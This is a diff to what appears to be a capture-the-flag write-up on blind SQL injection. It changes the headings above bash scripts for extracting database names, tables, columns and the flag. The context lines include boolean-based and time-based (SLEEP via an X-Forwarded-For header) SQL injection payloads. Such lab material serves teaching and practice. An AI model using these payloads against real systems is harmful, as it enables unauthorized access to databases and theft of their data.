@@ -15,7 +15,7 @@
 admin' and (select substr(database(),1,1))='s'-- -
 ```
 
-## Use this bash script to extract Database, tables, columns, and the flag. Just change the payload:
+## Use this bash script to extract Database, tables, columns, and the flag. Just change the payload and total_positions(the length):
 ```bash
 #!/bin/bash
 
@@ -94,7 +94,7 @@ admin' and (select substr(flag,1,1) from flag limit 1)='t'-- -
 X-Forwarded-For:1' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND (SELECT substr(database(), 1, 1))='s'-- -
 ```
 
-** Use this bash script to extract Database, tables, columns, and the flag. Just change the payload:
+## Use this bash script to extract Database, tables, columns, and the flag. Just change the payload:
 ```bash
 #!/bin/bash
 
